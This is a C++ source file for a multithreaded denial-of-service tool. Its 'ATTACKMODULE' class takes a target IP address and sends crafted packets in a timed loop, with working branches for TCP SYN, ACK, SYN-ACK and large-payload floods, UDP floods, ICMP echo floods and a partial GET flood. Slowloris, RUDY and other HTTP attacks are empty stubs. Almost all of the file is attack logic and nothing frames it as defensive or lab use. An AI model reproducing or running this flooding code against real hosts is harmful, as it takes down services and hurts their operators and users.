#include "../lib/atkmod.h"

ATTACKMODULE::ATTACKMODULE(char* dev, std::string tip, int type, int speed, int dur){
    this->dev = dev;
    this->atktype = type;
    this->speed = speed;
    this->dur = dur;

    get_targetinfo(tip);
}

// target의 정보 받아오기 //
void ATTACKMODULE::get_targetinfo(std::string tip){
    
    /* get target ip */
    inet_pton(AF_INET, tip.c_str(), &target_ip);
    
    /* get target mac */
    PKT packet = PKT(dev);
    packet.set_pcap();
    packet.set_attackinfo(target_ip, target_mac);
}

void ATTACKMODULE::attack(){
    std::thread AttackThreads[THREADS];
    
    for(int i = 0; i < THREADS; i++){
        AttackThreads[i] = std::thread(&ATTACKMODULE::attack_routine, this);
    }
    
    for(int i = 0; i < THREADS; i++){
        AttackThreads[i].join();
    }
}

// TODO:make attack_routine function
void ATTACKMODULE::attack_routine(){

    PKT packet(dev);
    packet.set_pcap();

    /* dur동안 send packet하기 */
    struct timeval start, end, current;
    gettimeofday(&start, 0);
    end.tv_sec = start.tv_sec + dur;

    while(1){
        gettimeofday(&current, 0);
        if(current.tv_sec - end.tv_sec >= 0) break;
    
        switch(atktype){

            // TCP_SYN_ATTACK
            case 1:
                packet.make_packet(target_mac, target_ip, TCP, SYN, 0);
                break;
    
            // TCP_ACK_ATTACK
            case 2:
                packet.make_packet(target_mac, target_ip, TCP, ACK, 0);
                break;

            // TCP_SYN-ACK_ATTACK
            case 3:
                packet.make_packet(target_mac, target_ip, TCP, SYN_ACK, 0);
                break;
            /*
            // TCP_CONNECTION_ATTACK
            case 4:

                break;

            // TCP_CONGESTION_CONTROL_ATTACK
            case 5:

                break;
            */

            // TCP_TSNAMI_ATTACK
            case 6:
                packet.make_packet(target_mac, target_ip, TCP, SYN, 1000);
                break;

            // UDP_ATTACK
            case 7:
                packet.make_packet(target_mac, target_ip, UDP, 0, 1000);
                break;

            // ICMP_ATTACK
            case 8:
                packet.make_packet(target_mac, target_ip, ICMP, ICMP_ECHO, 0);
                break;

            
            // GET_FLOODING_ATTACK
            case 9:

                // send ACK packet
                packet.handshake(target_mac, target_ip);

                packet.make_packet(target_mac, target_ip, TCP, SYN_ACK, 0);
                break;

            // POST_FLOODING_ATTACK
            case 10:

                break;

            // DYNAMIC_HTTP_REQ_FLOODING
            case 11:

                break;

            // SLOWLORIS_ATTACK
            case 12:

                break;

            // SLOWREAD_ATTACK
            case 13:

                break;

            // R-U-D-Y_ATTACK
            case 14:

                break;

            // BIG1_ATTACK
            case 15:

            break;
            
            default:
                printf("type error");
                break;
        }

    
        packet.send_packet();
    }
}